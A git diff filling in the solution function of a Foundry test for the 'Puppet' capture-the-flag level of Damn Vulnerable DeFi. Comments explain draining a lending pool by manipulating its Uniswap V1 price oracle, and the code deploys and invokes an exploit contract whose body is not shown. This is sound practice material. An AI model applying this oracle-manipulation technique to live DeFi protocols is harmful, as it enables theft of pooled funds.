@@ -7,6 +7,7 @@ import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {PuppetPool} from "../../src/puppet/PuppetPool.sol";
 import {IUniswapV1Exchange} from "../../src/puppet/IUniswapV1Exchange.sol";
 import {IUniswapV1Factory} from "../../src/puppet/IUniswapV1Factory.sol";
+import {PuppetSolve} from "./PuppetSolve.sol";
 
 contract PuppetChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -92,7 +93,21 @@ contract PuppetChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_puppet() public checkSolvedByPlayer {
-        
+        // The ratio in of eth and token in uniswap is 1:1 in the first place
+        // Attacker can manipulate the price through uniswap orcale by 
+        // swaping 1000 token for minimum 9 eth => the ratio changes to 0.1:1010
+        // => 1 eth equals to ~10000 token
+        // Using borrow() function with double eth as collateral => 20 eth to 100000 token
+
+        PuppetSolve exp = new PuppetSolve(
+            token,
+            lendingPool,
+            uniswapV1Exchange,
+            recovery
+        );
+        token.approve(address(exp), PLAYER_INITIAL_TOKEN_BALANCE);
+        token.transfer(address(exp), PLAYER_INITIAL_TOKEN_BALANCE);
+        exp.attack{value: PLAYER_INITIAL_ETH_BALANCE}();
     }
 
     // Utility function to calculate Uniswap prices
